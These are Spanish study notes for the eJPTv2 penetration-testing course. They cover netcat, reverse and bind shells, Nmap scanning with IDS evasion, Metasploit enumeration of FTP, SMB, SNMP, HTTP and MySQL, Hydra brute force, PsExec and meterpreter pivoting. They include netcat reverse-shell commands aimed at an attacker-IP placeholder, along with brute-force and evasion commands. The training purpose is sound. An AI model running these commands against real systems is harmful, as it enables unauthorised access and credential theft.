# Curso EJPTv2

# Herramientas

## Netcat

Netcat es una utilidad de red disponible en la mayoría de plataformas. Utiliza una arquitectura de comunicación servidor cliente. Se puede configurar para escuchar en puertos específicos y otro cliente puede conectarse a este servidor.

Para conectarnos a un sistema con netcat, utilizamos el siguiente comando:

```bash
nc <IP_Target> <port>
```

Podemos utilizar muchas opciones, por ejemplo:

```bash
nc -nvu <IP_Target> <port>
# -n -> sin resolución DNS
# -v -> Verbosity
# -u -> UDP
```

Vamos a configurar un cliente y un servidor. Configuramos un servidor con Python para descargar un recurso con Netcat desde el cliente:

```bash
python -m SimpleHTTPServer 80
```

Para obtener recursos de este servidor con Netcat, necesitamos conocer la IP y el puerto en el que hemos desplegado el servidor. Si abrimos el navegador en la máquina cliente, podremos acceder al directorio de la máquina que tiene el servidor.

Ahora vamos a configurar un listener con Netcat en nuestra máquina Kali:

```bash
nc -lvnp <listener_port>
# -l -> listener
# -v -> verbosity
# -n -> no DNS resolution
# -p -> port
```

Netcat queda en escucha en este momento, en el puerto especificado. Ahora, nos conectamos desde una máquina Windows, por ejemplo, con el siguiente comando:

```bash
nc.exe -nv <listener_IP> <listener_port>
```

En la terminal del listener, podremos ver la información a cerca de esta conexión. Ahora podemos enviar mensajes de una máquina a otra.

Netcat, por defecto se conectará al listener vía TCP, si el listener especifica la opción -u (UDP), el cliente que se conecta también debe especificar -u.

Ahora vamos a transferir archivos con Netcat. Tenemos que ponernos en listener desde el cliente (el que recibirá el fichero), con el siguiente comando:

```bash
nc -lvnp <port> > <file_name>
```

Queda en escucha. Ahora enviamos el fichero con la otra máquina:

```bash
nc -nv <IP_listener> <port> < <file_name>
```

## Bind Shells

Se trata de un tipo de shell remota, donde el atacante se conecta directamente al sistema objetivo, lo que permite la ejecución de comandos. Netcat se puede configurar para ejecutar un programa específico (opción -e) cuando los clientes se conectan al listener (servidor), como cmd.exe para Windows o /bin/bash en una máquina Linux.

Las Reverse Shell son mucho mejores que las Bind Shell, principalmente, porque para obtener una Bind Shell, tenemos que configurar un listener en la máquina objetivo, y para esto, necesitamos acceso a dicha máquina, otro problema, es que, si la máquina objetivo tiene un firewall, filtrará directamente nuestro tráfico, o la conexión fallará si actuamos a través de un puerto bloqueado.

## Reverse Shells

El atacante se conecta directamente a la shell del sistema objetivo. La conexión se puede realizar aunque el sistema de destino no tenga netcat. En este caso, no tenemos problema con el trafico, porque, normalmente, el trafico saliente no está controlado por el firewall u otros sistemas de seguridad. Un problema es que el exploit debe contener la IP del atacante, y un analista de seguridad podría encontrarla.

Vamos con el ejemplo. Nos ponemos en listener desde la máquina atacante:

```bash
nc -lvnp 1234
```

Queda en escucha. Ahora, desde la máquina objetivo (Windows), lanzamos es siguiente comando:

```bash
nc.exe -nv <IP_atacante> <puerto_atacante> -e cmd.exe
```

Ya tenemos una reverse shell en el atacante.

Si la máquina objetivo es Linux:

```bash
nc -nv <IP_atacante> <puerto_atacante> -e /bin/bash
```

### Reverse Shell Cheatsheet

Hay un repositorio en Github con muchas reverse shell en distintos lenguajes y para distintos sistemas operativos. 

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

### PowerShell-Empire

**PowerShell Empire** es un **framework de post-explotación** desarrollado en PowerShell y Python, diseñado para ayudar a los profesionales de la seguridad y *pentesters* a realizar pruebas de penetración y evaluaciones de seguridad en entornos Windows. Originalmente fue creado por el equipo de **PowerShell Empire** en 2015 y se convirtió en una herramienta popular debido a su capacidad para operar de forma sigilosa y sin archivos (*fileless*), aprovechando las capacidades nativas de PowerShell en sistemas Windows.

**Características Principales**

1. **Post-explotación sin archivos (*Fileless*)**:
    - Utiliza scripts en memoria para ejecutar comandos sin escribir nada en el disco, lo que dificulta su detección por los antivirus tradicionales.
2. **Gestión de agentes**:
    - Permite desplegar y gestionar múltiples agentes de forma remota. Estos agentes pueden ejecutar comandos, transferir archivos, y recopilar información del sistema comprometido.
3. **Módulos integrados**:
    - Incluye una variedad de módulos para tareas como:
        - Escalada de privilegios.
        - Exfiltración de datos.
        - Movimientos laterales dentro de la red.
        - Recolección de credenciales (por ejemplo, utilizando *Mimikatz*).
4. **Interfaz CLI interactiva**:
    - Proporciona una consola interactiva para gestionar agentes y ejecutar comandos de forma sencilla.
5. **Evasión de antivirus y detección**:
    - Emplea técnicas para ofuscar scripts y evitar la detección por soluciones de seguridad basadas en firmas.
6. **Soporte para HTTP, HTTPS y SMB**:
    - Puede configurar sus *listeners* para utilizar diferentes protocolos, facilitando la comunicación encubierta con los agentes.

# Metodología PenTester

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image.png)

# Recopilación de información

## Recopilación pasiva de información

Implica obtener tanta información como sea posible sin comprometerse activamente con el objetivo. Se utiliza información o recursos disponibles públicamente para obtener más información. Comenzamos buscando la IP del servidor (para una prueba de penetración en un sitio web) con el comando “host”:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%201.png)

Nos salen dos IP porque el servidor está detrás de CloudFlare, que es un proxy/firewall.

A continuación, el mejor lugar para encontrar información en un sitio web es viendo el archivo “robots.txt”. Este fichero especifica qué directorios no quiere el propietario que se indexen por los motores de búsqueda.

Las extensiones para el navegador **BuildWith**, **Wappalyzer** el comando “whatweb” son muy útiles  para obtener información sobre la estructura de un sitio web.

La herramienta **HTTrack** permite descargar un sitio web desde internet a un directorio local. Muy útil para analizar el código fuente o la estructura real de la página.

El comando **whois** <domain> (ejemplo: $ whois google.com) devuelve mucha información sobre el dominio introducido. También se puede utilizar en la página “https://who.is”.

**Website Footprinting** (huella del sitio web) con **Netcraft**. Podemos utilizar esta herramienta en la página netcraft.com.

Para un **reconocimiento DNS** (**DNS Recon**) no participamos activamente con el servidor DNS, simplemente estamos tratando de identificar los registros asociados con un dominio particular (registros txt, direcciones IP, etc).

DNS Recon es una herramienta que nos proporciona esta información. Para usarla, ejecutamos el comando “*dnsrecon -d <domain>*” en la terminal.

Una página con una función muy similar a esta herramienta es “**dnsdumpster.com**”. Hace un gráfico con todos los dominios encontrados, los geolocaliza, etc. Tiene una interfaz muy cómoda.

Detección WAF con **WAFWOOF**. Un WAF (Web Aplication Firewall) es un **firewall** de aplicaciones web. Esta herramienta se clona de Github (*EnableSecurity/wafw00f*).

La **enumeración de subdominios** podemos realizarla con la herramienta **sublister**. No se trata de fuerza bruta. Seguimos utilizando fuentes de información disponibles públicamente. Se instala con el comando “*sudo apt-get install sublist3r*”.

**Google Dorks** es una herramienta muy útil en esta etapa. Se pueden encontrar prompts optimizados para distintos tipos de búsqueda en la página “*exploit-db.com/google-hacking-database*”.

Para una recolección de correo electrónico (Email Harvesting) podemos utilizar la herramienta **theHarvester**. Para usarla, clonamos el siguiente repositorio de Github “*https://github.com/laramies/theHarvester*”. Encuentra correos que se han filtrado y están expuestos públicamente.

Existen bases de datos de contraseñas filtradas y disponibles publicamente, que nos servirán para tratar de autenticarnos con las direcciones de correo encontradas en el paso anterior, pero no lo haremos en esta fase. En la página **haveibeenpwned** podemos comprobar si dichos correos aparecen en alguna filtración de datos.

## Recopilación activa de información

Implica recopilar la mayor cantidad de información posible mediante la participación activa con el sistema objetivo. Escaneo de puertos en la dirección IP objetivo y los respectivos servicios y versiones con N-Map para identificar vulnerabilidades. Para esta fase se necesita autorización de la organización.

La página [**ZoneTransfer.me**](http://ZoneTransfer.me) tiene un tutorial para **transferencia de zona DNS**. 

### Host Dicovery con Nmap

Para buscar hosts en nuestra red, usamos el argumento “-sn”. Para ello necesitamos conocer la red en la que estamos conectados, con el comando “ip a”. 

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%202.png)

Estoy en la red 192.168.1.0/24. El comando para detectar hosts con **Nmap** sería el siguiente:

```bash
sudo nmap -sn 192.168.1.0/24
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%203.png)

Podemos utilizar también la herramienta **netdiscover**. Esta herramienta funciona mediante el envío de solicitudes ARP. Comando para descubrir todas las redes:

```bash
sudo netdiscover
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%204.png)

Comando para una red específica:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%205.png)

Hay varias técnicas para detectar hosts en una red: mediante barrido ping (ICMP), mediante resolución ARP, con paquetes TCP con SYN, etc. Es importante mapear con varias técnicas, porque, por ejemplo, el firewall de Windows bloquea tráfico ICMP, y Nmap no detectaría ese host, por lo que sería necesario utilizar la técnica de resolución ARP. En Nmap, indicamos que no use eco ICMP con el parámetro -Pn.

### Port Scanning con Nmap

Ahora escaneamos un host objetivo para detectar qué puertos tiene abiertos y qué servicios corren en ellos. Primero realizamos un escaneo predeterminado con Nmap:

```bash
nmap <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%206.png)

Hemos escaneado sólo puertos conocidos. Los sistemas Windows bloquean los paquetes ICMP, y después de un escaneo, nmap puede decirnos que el host no está activo, cuando en realidad sí que lo está. En algunos sistemas, cuando se establece por completo una conexión TCP (3-way handshake), ésta queda registrada. Nmap tiene un modo de escaneo “**-sS**” (Stealth Scan) que no llega a completar la conexión al descubrir un puerto para que no quede registrada. Podemos especificarle a Nmap que no utilice paquetes ICMP con el argumento “-Pn”.

```bash
nmap -Pn <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%207.png)

El resultado es el mismo, porque el host que he escaneado tiene SO linux. Para escanear todo el rango de puertos (65535) utilizamos el siguiente comando:

```bash
nmap -Pn -p- <IP target>
```

Para puertos específicos:

```bash
nmap -Pn -p 22,80 <IP target>
```

```bash
nmap -Pn -p1-5000 <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%208.png)

Hemos descubierto 4 puertos más. Si algún puerto aparece con el estado “filtered”, significa que puede estar protegido con algún tipo de firewall.

Podemos filtrar por UDP o TCP. Para UDP:

```bash
nmap -Pn -sU <IP target>
```

Podemos aumentar el contenido de información que muestra Nmap con “-vvv”.

```bash
nmap -Pn -vvv <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%209.png)

Podemos analizar la versión de los servicios que corren en los puertos con el argumento “sV”

```bash
nmap -Pn -sV -vvv <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2010.png)

Añadiendo el parámetro “-O”, Nmap intentará detectar qué sistema operativo se está ejecutando.

```bash
nmap -Pn -O <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2011.png)

Podemos realizar un análisis de secuencia de comandos incluyendo el parámetro “-sC”. Esto ejecuta una lista de scripts Nmap en los puertos que están abiertos para identificar más información.

```bash
nmap -Pn -sC <IP target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2012.png)

Podemos hacer un escaneo agresivo que combina el escaneo de servicios (-sV), sistema operativo (-O) y el escaneo de script (-sC) con -A.

```bash
nmap -Pn -A <IP target>
```

Podemos ralentizar el escaneo con los parámetros entre -T0 y -T5. Cuanto mayor sea el número más rápido será el escaneo, pero aumenta mucho el trafico de paquetes.

 (paranoid | sneaky | normal | aggressive | insane).

```bash
nmap -Pn -sV -T5 <IP target>
```

Además, con la opción “—scan-delay <time>” podemos ajustar un tiempo entre pruebas, con la opción “—min-rate <num>” envía como mínimo *num* paquetes por segundo.

Podemos exportar los resultados del escaneo con -oN para un formato normal (.txt).

```bash
nmap -Pn -sV -oN scan.txt <IP target>
```

Si queremos exportar a un fichero XML mucho más claro, podemos usar el siguiente comando:

```bash
nmap -oX scan.xml —stylesheet=https://svn.nmap.org/nmap/docs/nmap.xsl <IP target>
```

Comando ejemplo Nmap:

```bash
nmap -T4 -sS -sV --version-intensity 8 -O —osscan-guess -p- <IP target>
```

- -T4: Velocidad agresiva.
- -sS: Escaneo sigiloso.
- -sV: Detección de versión de los servicios.
- —version-intensity 8: Especifica la intensidad de detección de la versión del servicio a 8.
- -O: Detección del SO.
- —oscan-guess: Detección agresiva del SO.
- -p-: Escaneo de todo el tango de puertos (65.535)

### NMAP Scripting Engine (NSE)

Nmap utiliza scripts por defecto (los más relevantes) para la detección de servicios con el parámetro “-sC”. Se usa en combinación con un escaneo de puertos, sino no funcionará correctamente.

```bash
nmap -sS -sV -sC -p- -T4 <IP target>
```

Como podemos comprobar, obtenemos mucha más información sobre los servicios:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2013.png)

Por ejemplo, para una base de datos, podríamos obtener el tamaño, el nombre, etc. Incluso podemos obtener el SO del kernel donde corre dicho servicio. Para buscar scripts en la lista de Nmap:

```bash
ls -la /usr/share/nmap/scripts/ | grep -e “mongodb”
```

Si queremos buscar info sobre un script en concreto:

```bash
nmap —script-help=mongodb-databases
```

Para ejecutar un script específico:

```bash
nmap -sS -sV —script=mongodb-info -p- -T4 <IP target>
```

### Firewall Detection & IDS Evasion con NMAP

Nmap tiene funciones para detectar firewalls en hosts. Con el parámetro “-sA” Nmap nos reporta si el puerto está o no filtrado (filtered/unfiltered).

```bash
nmap -Pn -sA -p- <IP target>
```

Fragmentar los paquetes que envía nmap puede evitar que nos detecte un IDS. El parámetro para fragmentarlos en “-f” (”-F” es para que escanee los 100 puertos más utilizados).

```bash
nmap -Pn -sS -sV -p- -f <IP target>
```

Podemos especificar el tamaño máximo de los fragmentos con el parámetro “-mtu <bytes>”.

```bash
nmap -Pn -sS -sV -p- -f -mtu 8 <IP target>
```

Otra técnica de evasión es utilizar IPs señuelo. Esto falsificará la IP de la puerta de enlace. Lo hacemos con el parámetro “-D <IP_señuelo_1,IP_señuelo_2,IP_señuelo_n>”. (—data-length es para establecer la longitud máxima de los datos).

```bash
nmap -Pn -sS -sV -f —data-length 200 -D <IP_señ_1,IP_señ_2,IP_señ_n> <IP target>
```

### Escaneo de servicios

Para importar los resultados de un escaneo con Nmap a **Metasploit**, tenemos que exportar los resultados de Nmap a un formato XML:

```bash
nmap -Pn -sV -O <IP target> -oX scan.xml
```

Ahora vamos a importar estos resultados en **msfconsole**, pero para poder utilizar esta consola de metasploit, debemos iniciar el servicio postgresql:

```bash
service postgresql start
```

A continuación iniciamos la consola de Metasploit:

```bash
msfconsole
msf5 > db_status # Comprobamos el estado de la base de datos.
```

Ahora necesitamos crear un nuevo espacio de trabajo para los resultados del escaneo. Comprobamos los espacios de trabajo disponibles con el siguiente comando (inicialmente sólo hay uno “default”):

```bash
msf5 > workspace
```

Para crear un espacio de trabajo para importar nuestros resultados:

```bash
msf5 > workspace -a <name> # Creamos workspace específico.
msf5 > db_import <ruta output nmap> # Importamos el fichero XML
msf5 > hosts # Comprobamos que se han importado correctamente los datos.
msf5 > services # Comprueba los servicios del hosts descubiertos en el escaneo.
```

Ahora podemos iniciar nuevamente un escaneo de Nmap desde dentro de msfconsole y se guardaran automáticamente los resultados en la base de datos para el espacio de trabajo actual.

```bash
msf5 > db_nmap -Pn -sV -O <IP target>
```

### Escaneo de puertos con Metasploit

Esto es muy útil en casos en los que descubrimos que nuestro objetivo está conectado a otra red, y queremos escanear con Nmap los hosts de esa otra red. Como no podemos escanearlos directamente, tendríamos que hacer **Pivoting** con Metasploit y utilizar Nmap dentro de la consola de Metasploit. Para ver los módulos que podemos utilizar para escanear puertos con msfconsole lanzamos el siguiente comando:

```bash
msf5 > search portscan
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2014.png)

Para usar uno de ellos:

```bash
msf5 > use auxiliary/scanner/portscan/tcp
msf5 > show options # Ver que datos debemos introducir en el modulo.
msf5 > set RHOST <IP target> # Insertamos la IP del objetivo.
msf5 > run # Iniciamos el escaneo.
```

# Enumeración

## Enumeración de Servicios, Usuarios y Compartidos

### Enumeración FTP

Este servicio se usa para compartir archivos de forma remota. Normalmente corre en el puerto 21. Para ver los módulos auxiliares disponibles en Metasploit tendremos que filtrar la búsqueda:

```bash
msf5 > search type:auxiliary name:ftp
```

En un primer momento nos interesan los de tipo scanner que realicen una búsqueda de la versión del servicio, como por ejemplo:

```bash
auxiliary/scanner/ftp/ftp_version 
```

A continuación podremos buscar exploits para el servicio específico que está corriendo. Existe también un modulo de fuerza bruta para ftp:

```bash
auxiliary/scanner/ftp/ftp_login
```

Le podemos proporcionar nombre de usuario para probar, si no tenemos ninguno, podemos proporcionar diccionarios:

```bash
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
```

```bash
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Ejemplo de output y autenticación por ftp con las credenciales obtenidas:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2015.png)

Podemos realizar fuerza bruta con **hydra** de la siguiente forma:

```bash
hydra -L /users.txt -P /passwords.txt <IP_Target> -t 4 ftp
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2016.png)

### Enumeración SMB

SMB es un protocolo de intercambio de archivos para Windows en una red local. Usa normalmente el puerto 445. Samba es la implementación de SMB para Linux. La tecnología de ambas funciona exactamente igual y no varía la técnica de enumeración de una a otra. Filtramos la búsqueda de módulos en msfconsole:

```bash
search type:auxilary name:smb
```

Primero utilizamos el módulo scanner para detectar la versión del servicio:

```bash
use auxiliary/scanner/smb/smb_version
```

Si la salida nos dice que el SO es Windows, pero el servicio que corre es Samba-Ubuntu, el SO correcto que corre en el host es Linux. A continuación enumeramos usuarios:

```bash
use auxiliary/scanner/smb/smb_enumusers
```

Ahora vamos a enumerar recursos compartidos y cambiamos a true la opción “ShowFiles” para que nos los muestre.:

```bash
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
```

En este punto podemos utilizar el modulo de fuerza bruta con uno de los usuarios obtenidos antes, por ejemplo, “admin”:

```bash
use auxiliary/scanner/smb/smb_login
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Una vez obtenida la contraseña, iniciamos sesión en smbclient (fuera de msfconsole):

```bash
smbclient -L \\\\<IP target>\\ -U <user>
```

Para acceder a un directorio, indicamos la ruta después de las barras de la IP:

```bash
smbclient -L \\\\<IP target>\\<ruta directorio compartido> -U <user>
```

Por ejemplo:

```bash
smbclient -L \\\\192.91.46.3\\public -U admin
smbclient -L \\\\192.91.46.3\\aisha -U admin
```

Para descargar ficheros funciona igual que ftp:

```bash
get <file name>
```

Con un objetivo Linux nos puede ser útil este comando:

```bash
enum4linux -a <IP target>
```

### Enumeración SMB y NetBIOS (PIVOTING)

**NetBIOS** (Network Basic Input/Output System) es un protocolo de comunicación que permite que los dispositivos en una red se identifiquen y se comuniquen entre sí. No es un protocolo de transferencia de archivos, sino un **servicio de nombres y sesión**. Opera en puertos TCP/UDP:

- 137 (Name Service)
- 138 (Datagram Service)
- 139 (Session Service)

**SMB** es un protocolo de red que permite compartir archivos, impresoras y otros recursos en una red. SMB usa NetBIOS en versiones antiguas, pero en versiones modernas (SMBv2 y SMBv3) ya no depende de NetBIOS y puede ejecutarse directamente sobre TCP/IP. Opera en el puerto TCP:

- 445 (bypassing NetBIOS, versiones modernas).
- 139 (Con NetBIOS).

Vamos a utilizar un ejemplo con una topología de red en la que, desde nuestro Kali, podremos acceder a una máquina, desde la que podremos acceder a otra haciendo pivoting. Comenzamos con un escaneo de los servicios de la maquina 1.

```bash
nmap -sS -sV -sC <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2017.png)

Vemos que tenemos NetBIOS como servicio de sesión en el puerto 139, y SMB en el puerto 445.

Lo primero que haremos, será una enumeración básica de NetBIOS con la herramienta **nbtscan**:

```bash
nbtscan <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2018.png)

No encontramos nada, así que vamos a realizar un escaneo de Nmap para UDP, sobre el puerto 137 y utilizamos el siguiente script:

```bash
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2019.png)

Vemos que parece que el puerto está filtrado, así que vamos a hacer una enumeración de SMB utilizando un script de Nmap:

```bash
nmap -p445 --script smb-protocols <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2020.png)

Nos dice que la versión SMBv1 es compatible. Vamos a comprobar la seguridad de SMB con el siguiente escaneo:

```bash
nmap -p445 --script smb-security-mode <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2021.png)

Con este script nos hemos asegurado de que es posible la autenticación. Ahora vamos a probar con la herramienta **smbclient**:

```bash
smbclient -L <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2022.png)

Cuando nos pide la contraseña la dejamos en blanco, como si se tratara de un acceso anonymous (null session). Vamos a intentar enumerar usuarios con el siguiente script de Nmap:

```bash
nmap -p445 --script smb-enum-users.nse <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2023.png)

Vemos varios usuarios (admin, Administrator, root, etc). Además, vemos información que nos dice que las contraseñas no caducan. Podemos aprovechar para realizar un ataque de fuerza bruta con **Hydra** para estos usuarios, y si conseguimos contraseñas, podemos utilizar **PsExec** para autenticarnos.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2024.png)

Ahora nos autenticamos con PsExec:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2025.png)

Podemos usar también el modulo psexec de metasploit:

```bash
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2026.png)

A continuación, vamos a intentar hacer ping desde esta máquina en la que acabamos de entrar a la otra que está conectada.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2027.png)

Para utilizar el comando Ping, primero tenemos que cambiar a una Shell.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2028.png)

Tenemos conexión entre la máquina 1 y la 2. Ahora, desde la sesión meterpreter, vamos a lanzar el comando **autoroute**, para configurar una ruta hasta esa segunda máquina:

```bash
run autoroute -s <red_secundaria>
# La red secundaria es la que conecta la maquina 1 con la 2. 
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2029.png)

Pasamos la sesión meterpreter a segundo plano y vamos a utilizar el siguiente módulo de metasploit:

```bash
use auxiliary/server/socks_proxy
set VERSION 4a
set SERVPORT 9050
```

Comprobamos que tenemos el proxy en escucha:

```bash
netstat -antp
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2030.png)

Ahora ya podemos escanear la máquina 2 a través del proxy que creamos.

```bash
proxychains nmap -sT -Pn -sV -p 445 <IP_Target_2>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2031.png)

### Enumeración SNMP

SNMP (Simple Network Management Protocol) es un protocolo utilizado para monitorear y administrar redes (switches, impresoras, etc). Permite a los administradores de red consultar información sobre el estado de los dispositivos, configurar ciertos ajustes y recibir alertas cuando ocurren eventos específicos. Tiene los siguientes componentes:

- SNMP Manager. El sistema responsable.
- SNMP Agent. Software que corre en los dispositivos.
- Management Information Base (MIB). Base de datos que define la estructura de los datos disponibles a través de SNMP. Cada dato tiene un identificador único denominado OID (Object Identifier).

Existen 3 versiones: SNMPv1, SNMPv2 y SNMPv3, que van incrementando la seguridad. Este protocolo utiliza los siguientes puertos:

- 161 UDP para consultas.
- 162 UDP para notificaciones.

Para la enumeración realizamos los siguientes pasos:

- Identificar dispositivos con SNMP habilitado.
- Extraer información del sistema.
- Identificar cadenas comunitarias predeterminadas o débiles.
- Enumeración de la configuración de red.
- Recopilación de usuarios y grupos.
- Identificar servicios y aplicaciones.

Vamos con el ejemplo. Primero hacemos un escaneo UDP con Nmap del puerto 161.

```bash
nmap -sU -p 161 <IP_Target>
```

Podemos listar los scripts de Nmap que nos interesan con el siguiente comando:

```bash
ls  /usr/share/nmap/scripts/ | grep -e “snmp”
```

Vamos a usar uno de fuerza bruta:

```bash
nmap -sU -p 161 --script=snmp-brute <IP_Target>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2032.png)

Con las credenciales que hemos conseguido, vamos a autenticarnos con la herramienta **snmpwalk**, y debemos saber de antemano la versión de SNMP que corre en el sistema.

```bash
snmpwalk -v 1 -c public <IP_Target>
# -v version
# -c usuario
```

Nos devuelve mucha información, pero no es legible. Podemos utilizar todos los scripts de nmap y guardar los resultados en un formato que nos sea de utilidad:

```bash
nmap -sU -p 161 --script=snmp* <IP_Target> > snmp_info
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2033.png)

Tenemos muchísima información, entre la que encontramos varios usuarios, así que, vamos a usar fuerza bruta con hydra:

```bash
hydra -l administrator -P <Passwords_list> <IP_Target> smb
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2034.png)

Si obtenemos credenciales podemos autenticarnos con PsExec.

### Enumeración SAMBA (Linux)

SAMBA es una implementación de SMB para Linux, y permite a sistemas Windows acceder a archivos y dispositivos Linux. Para enumerar utilizamos los mismos métodos que en el apartado de SMB y para explotar este servicio, podemos hacer uso de las siguientes herramientas:

- Smbmap
- Metasploit
- enum4Linux
- smbclient
- Hydra

Primero escaneamos con Nmap para ver la versión del servicio:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2035.png)

Ahora, realizamos un ataque de fuerza bruta para el usuario “admin” con **Hydra**:

```bash
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.124.176.3 smb
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2036.png)

Podemos enumerar los archivos compartidos con **smbmap**, con el siguiente comando y utilizando las credenciales descubiertas:

```bash
smbmap -H <Target_IP> -u <user> -p <pass>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2037.png)

Para acceder a esos archivos, podemos hacerlo con la herramienta **smbclient**. Utilizamos el siguiente comando:

```bash
smbclient -L <IP_Target> -U <user>
```

Introducimos la contraseña:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2038.png)

Nos proporciona prácticamente la misma información, aunque ahora conocemos un grupo de trabajo “RECONLABS”. Si queremos acceso a la interface, utilizamos el siguiente comando:

```bash
smbclient [//192.124.176.3/shawn](https://192.124.176.3/shawn) -U admin
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2039.png)

Ya tenemos la línea de comandos de smb. Ahora vamos a enumerar con la herramienta **enum4linux**:

```bash
enum4linux -a <IP_Target>
# -a para que muestre toda la info
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2040.png)

Si realizamos la enumeración autenticándonos, obtenemos muchísima información.

```bash
enum4linux -a -u <user> -p <pass> <IP_Target>
```

### Enumeración Servidor Web

Algunos ejemplos de servidor web son Apache, Nginx o Microsoft IIS. Utilizan HTTP (protocolo de la capa de aplicación) para facilitar la comunicación entre cliente y servidor. Dentro de la consola de Metasploit, podemos establecer globalmente la IP objetivo para no tener que modificar RHOSTS cada vez que utilizamos un modulo. Lo haremos con el siguiente comando:

```bash
setg RHOSTS <IP target>
setg RHOST <IP target>
```

Buscamos módulos http:

```bash
search type:auxiliary name:http
```

Comenzamos con el scanner de versiones:

```bash
use auxiliary/scanner/http/http_version
set SSL true # Si nuestro objetivo tiene certificado SSL (https)
```

Ahora buscamos un módulo para el encabezado:

```bash
use auxiliary/scanner/http/http_header
```

Esto nos da información sobre el servidor. Ahora realizamos una enumeración adicional de directorios ocultos alojados en el servidor. 

```bash
search robots_txt
use auxiliary/scanner/http/robots_txt
```

Descargamos los directorios para investigar el contenido:

```bash
curl http://<IP target>/<dir name>/
```

Adicionalmente,  vamos a seguir con la búsqueda de directorios con fuerza bruta.

```bash
search dir_scanner
use auxiliary/scanner/http/dir_scanner
```

Podemos especificar en PATH la ruta a partir de la que queremos buscar. Por defecto “/”.

Esto nos da una lista de los directorios disponibles indicándonos si necesitamos o no autenticación para acceder. Vamos a escanear archivos:

```bash
search files_dir
use auxiliary/scanner/http/files_dir
```

El diccionario ya está especificado por defecto. Para utilizar fuerza bruta para autenticarse y acceder a algún directorio protegido podemos utilizar:

```bash
use auxiliary/scanner/http/http_login
set AUTH_URI /<dir_name>/ # Opcional
```

Si no encuentra las credenciales, usamos diccionarios mejores:

```bash
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
```

```bash
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Si tampoco lo conseguimos así, probamos otra forma de obtener credenciales. Enumeramos usuarios:

```bash
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
```

Si obtenemos algún usuario válido, volvemos a utilizar el módulo anterior especificando el usuario correcto:

```bash
use auxiliary/scanner/http/http_login
set VERBOSE true # Para ver resultados durante la ejecución
set USER_FILE <name>
```

### Enumeración MySQL

MySQL usa el puerto 3306 de forma predeterminada. Lo primero que haremos, será escanear la versión exacta del servicio con msfconsole:

```bash
use auxiliary/scanner/portscan/tcp # Debemos ver en que puerto corre mysql
search type: auxiliary name:mysql
use auxiliary/scanner/mysql/mysql_version
```

A continuación, utilizamos fuerza bruta con el siguiente módulo:

```bash
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

